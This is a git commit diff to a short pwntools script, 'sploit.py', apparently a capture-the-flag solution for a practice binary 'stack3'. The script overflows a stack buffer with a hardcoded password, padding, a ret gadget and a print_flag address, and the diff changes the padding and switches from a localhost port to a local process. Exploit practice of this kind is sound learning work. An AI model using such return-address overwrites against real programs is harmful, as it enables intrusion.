e17085ac105bdc0e1ff673061616b15cd092c346
danissimurr <rudakov.daniil.2004@mail.ru>
2026-04-24 10:54:56 +0300

    3

--- rev3/3/sploit.py
+++ rev3/3/sploit.py
@@ -1,15 +1,15 @@
 from pwn import *
 
-print_flag_addr = p64(0x40132c)
+print_flag_addr = p64(0x40132C)
 ret = p64(0x4013CF)
 
 password = b'3xtr3mely_s3cur3_p4s5word'
 offset = 136
-padding = b'A' * (offset - len(password) - 8)
+padding = b'A' * (offset - len(password))
 payload = password + padding + ret + print_flag_addr
 
 
-p = remote("127.0.0.1", 20004)
-p.recvuntil(b"-> ")
+# p = remote("127.0.0.1", 20004)
+p = process("./stack3")
 p.sendline(payload)
 p.interactive()
